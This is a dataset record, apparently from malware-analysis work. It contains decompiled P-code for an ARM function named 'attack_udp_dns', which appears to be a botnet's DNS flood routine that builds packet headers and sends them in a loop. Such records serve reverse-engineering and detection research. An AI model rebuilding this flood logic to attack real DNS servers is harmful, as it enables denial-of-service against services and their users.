Label: 856
Function: attack_udp_dns
Architecture: arm
Source File: Unknown
Entry Point: 00019540

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x1000021d, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x3d, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x36e, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x36e, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x36e, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x36e, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x36e, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x36e, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x36e, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x36e, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x36e, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x36e, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x36e, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x36e, 4)
(unique, 0x1000026d, 4) CAST (stack, 0xffffffffffffffac, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (const, 0x0, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x37f, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x37f, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb8, 4) , (const, 0xa, 4)
(register, 0x20, 2) CALL (ram, 0x1a314, 8) , (unique, 0x10000271, 4) , (const, 0x14, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x38f, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x38f, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x38f, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x38f, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x38f, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x38f, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x38f, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x38f, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x38f, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x38f, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x38f, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x38f, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x38f, 4)
(unique, 0x10000271, 4) CAST (stack, 0xffffffffffffffb8, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x396, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x396, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb8, 4) , (const, 0xa, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (const, 0x0, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x3a7, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x3a7, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x6, 4)
(unique, 0x44100, 2) LOAD (const, 0x1a1, 4) , (unique, 0x9180, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x4, 4)
(register, 0x28, 4) INT_ZEXT (stack, 0xffffffffffffffd3, 1)
(register, 0x2c, 4) INT_ADD (register, 0x28, 4) , (stack, 0xffffffffffffffc4, 4)
(register, 0x2c, 4) INT_ADD (register, 0x2c, 4) , (const, 0x1b, 4)
(register, 0x20, 2) CALL (ram, 0x1a3b4, 8) , (stack, 0xffffffffffffffb8, 4) , (stack, 0xffffffffffffffb4, 4) , (unique, 0x44100, 2) , (register, 0x2c, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x3ca, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x3ca, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x3ca, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x3d1, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x3d1, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x6, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100001df, 4) , (stack, 0xffffffffffffffc8, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x3fc, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x3fc, 4)
(unique, 0x100001d3, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffff94, 4) , (const, 0x18, 4)
(unique, 0x100001d7, 4) PTRSUB (unique, 0x100001d3, 4) , (const, 0x0, 4)
(unique, 0x100001df, 4) PTRSUB (unique, 0x8280, 4) , (const, 0x0, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x100001d7, 4) , (const, 0x4, 4)
(unique, 0x44100, 2) LOAD (const, 0x1a1, 4) , (unique, 0x9180, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x2, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (unique, 0x44100, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x42b, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x42b, 4)
(unique, 0x100001eb, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffff94, 4) , (const, 0x18, 4)
(unique, 0x100001ef, 4) PTRSUB (unique, 0x100001eb, 4) , (const, 0x0, 4)
(unique, 0x9180, 4) PTRSUB (unique, 0x100001ef, 4) , (const, 0x2, 4)
(register, 0x28, 4) INT_ZEXT (stack, 0xffffffffffffffd3, 1)
(register, 0x2c, 4) INT_ADD (register, 0x28, 4) , (stack, 0xffffffffffffffc4, 4)
(register, 0x28, 4) INT_ADD (register, 0x2c, 4) , (const, 0x2f, 4)
(register, 0x2c, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffff94, 4) , (const, 0x18, 4)
 ---  CALL (ram, 0x2ba8c, 8) , (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffbc, 4) , (register, 0x28, 4) , (const, 0x4000, 4) , (unique, 0x10000275, 4) , (const, 0x10, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x48c, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x48c, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x48c, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x48c, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x48c, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x48c, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x48c, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x48c, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x48c, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x48c, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x48c, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x48c, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x48c, 4)
(unique, 0x10000275, 4) CAST (register, 0x2c, 4)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffff94, 4) , (const, 0x1, 4)
(register, 0x28, 4) INT_ZEXT (register, 0x20, 1)
(ram, 0x19cb0, 4) MULTIEQUAL (ram, 0x19cb0, 4) , (ram, 0x19cb0, 4)
(ram, 0x19cb4, 4) MULTIEQUAL (ram, 0x19cb4, 4) , (ram, 0x19cb4, 4)
(stack, 0xffffffffffffff94, 4) MULTIEQUAL (stack, 0xffffffffffffff94, 4) , (register, 0x2c, 4)
(stack, 0xffffffffffffff98, 4) MULTIEQUAL (stack, 0xffffffffffffff98, 4) , (stack, 0xffffffffffffff98, 4)
(stack, 0xffffffffffffff9c, 4) MULTIEQUAL (stack, 0xffffffffffffff9c, 4) , (stack, 0xffffffffffffff9c, 4)
(stack, 0xffffffffffffffa0, 4) MULTIEQUAL (stack, 0xffffffffffffffa0, 4) , (stack, 0xffffffffffffffa0, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (stack, 0xffffffffffffffa4, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffc4, 4) MULTIEQUAL (stack, 0xffffffffffffffc4, 4) , (stack, 0xffffffffffffffc4, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (stack, 0xffffffffffffffc8, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffcc, 4) MULTIEQUAL (stack, 0xffffffffffffffcc, 4) , (stack, 0xffffffffffffffcc, 4)
(stack, 0xffffffffffffffd3, 1) MULTIEQUAL (stack, 0xffffffffffffffd3, 1) , (stack, 0xffffffffffffffd3, 1)
(stack, 0xffffffffffffffd4, 2) MULTIEQUAL (stack, 0xffffffffffffffd4, 2) , (stack, 0xffffffffffffffd4, 2)
(stack, 0xffffffffffffffd6, 2) MULTIEQUAL (stack, 0xffffffffffffffd6, 2) , (stack, 0xffffffffffffffd6, 2)
(stack, 0xffffffffffffffd8, 2) MULTIEQUAL (stack, 0xffffffffffffffd8, 2) , (stack, 0xffffffffffffffd8, 2)
(stack, 0xffffffffffffffda, 1) MULTIEQUAL (stack, 0xffffffffffffffda, 1) , (stack, 0xffffffffffffffda, 1)
(stack, 0xffffffffffffffdb, 1) MULTIEQUAL (stack, 0xffffffffffffffdb, 1) , (stack, 0xffffffffffffffdb, 1)
(stack, 0xffffffffffffffdc, 2) MULTIEQUAL (stack, 0xffffffffffffffdc, 2) , (stack, 0xffffffffffffffdc, 2)
(stack, 0xffffffffffffffdf, 1) MULTIEQUAL (stack, 0xffffffffffffffdf, 1) , (stack, 0xffffffffffffffdf, 1)
(stack, 0xffffffffffffffe0, 4) MULTIEQUAL (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffffe0, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffea, 1) MULTIEQUAL (stack, 0xffffffffffffffea, 1) , (stack, 0xffffffffffffffea, 1)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
(unique, 0x2480, 1) INT_SLESS (stack, 0xffffffffffffff94, 4) , (unique, 0x10000255, 4)
 ---  CBRANCH (ram, 0x19a6c, 1) , (unique, 0x2480, 1)
(unique, 0x10000255, 4) CAST (register, 0x28, 4)
(ram, 0x19cb0, 4) MULTIEQUAL (ram, 0x19cb0, 4) , (ram, 0x19cb0, 4) , (ram, 0x19cb0, 4)
(ram, 0x19cb4, 4) MULTIEQUAL (ram, 0x19cb4, 4) , (ram, 0x19cb4, 4) , (ram, 0x19cb4, 4)
 ---  RETURN (const, 0x0, 4)
(ram, 0x19cb0, 4) COPY (ram, 0x19cb0, 4)
(ram, 0x19cb4, 4) COPY (ram, 0x19cb4, 4)
